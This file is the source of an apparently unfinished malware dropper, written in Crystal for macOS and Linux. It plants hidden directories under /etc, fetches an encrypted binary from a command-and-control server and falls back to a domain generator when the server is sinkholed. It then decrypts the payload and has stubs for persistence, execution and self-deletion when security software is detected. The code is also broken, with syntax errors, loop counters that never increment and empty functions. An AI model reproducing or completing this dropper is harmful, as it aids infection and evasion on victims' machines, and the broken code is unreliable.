require "http/client"
require "io/memory"
require "file_utils"
require "secure_random"
require "openssl"

# Dropper supports macOS and Ubuntu-based Linux targets.
# Change the PLATFORM and ARCH constants to reflect the target info. PLATFORM = MACOS/UBUNTU, ARCH=32/64/ARM.
PLATFORM = "MACOS"
ARCH = "64"
# This should point to the binary download location.
BINARY_URL = "http://example..com/bin/" + PLATFORM + ARCH 
# /etc is used to maintain compatability with both macOS and Linux. Targeted attacks can use custom infection locations.
INFECTION_ROOT = "/etc"
DIRECTORY_NAME = "." + SecureRandom.uuid()
BINARY_NAME =  "." + SecureRandom.uuid()
# Provide the IV and Keys generated by NightFire.
DECRYPTION_IV = "IFYOUDONTCHANGETHISURGONNAHAVEABADTIME"
DECRYPTION_KEY = "IFYOUDONTCHANGETHISURGONNAHAVEABADTIME"

def enter_directory()
	FileUtils.cd(INFECTION_ROOT)
	if File.exists?(DIRECTORY_NAME)
		# What a conincidence!
		# We'll just remove it then recreate it.
		FileUtils.rm_r(DIRECTORY_NAME)
		Dir.mkdir(DIRECTORY_NAME, mode = 5101)
		FileUtils.cd(DIRECTORY_NAME)
	else
		Dir.mkdir(DIRECTORY_NAME, mode = 5101)
	end
end

def retrieve_binary()
	retrieval_attempts = 0
	begin
		while retrieval_attempts < 3
			# Setup HTTP client to retrieve binary.
			client = HTTP::Client.get(BINARY_URL)
			# Handle the HTTP error codes as implemented in NightFire.
			case client.status_code
			when 200
				# Connection is OK, begin download.
				File.open(BINARY_NAME), "wb") do |file|
					file.puts(client.body)
					break
				end
			when 404
				# Binary not found. Primary domain might be sunk, or the BINARY_URL was misconfigured.
				# Fall back to deterministic domain generator.
				retrieve_binary_by_generated_domain()
			when 400
				# Something might be tampering with traffic (ie. transparent proxy).
					retrieval_attempts + 1
			when 503
				# CnC server overwhelmed.
				# Wait a 15 minutes then try again.
				sleep(900)
			when 500 
				# We managed to catch the server while it was swapping out binaries.
				# Wait 1 minute then retry.
				sleep(60)
				retrieval_attempts + 1
			else
				# Not an error we care to handle, increment and try again.
				retrieval_attempts + 1
			end
		end
		if retrieval_attempts >= 3
			# Couldn't retrieve binary.
			seppuku()
		else
			# Retrieval was a succsess, return true.
			true
	rescue exception
		# Either couldn't connect to internet at all, or something else horrible.
		puts(exception.message)
		seppuku()
	end
end

def decrypt_binary()
	begin
		FileUtils.cd(INFECTION_ROOT)
		FileUtils.cd(DIRECTORY_NAME)
		if File.file?(BINARY_NAME)
			# assign file handle 
		else
			# PSP probably just nuked our encrypted binary. Clean up before we get completely mauled.
			seppuku()
		end
	rescue exception
		puts(exception.message)
	end	
	decipher = OpenSSL::Cipher::Cipher.new(AES-128-CBC)
	decipher.decrypt
	decipher_IV = DECRYPTION_IV
	decipher.key = DECRYPTION_KEY
	decypted_binary = decipher.update(encrypted_binary) + decipher.final
	# write decrypted_binary to disk.
end

def execute_payload()
	# establish persistance and execute
end

def seppuku()
	# delete dropper
end


def main()
end

main()
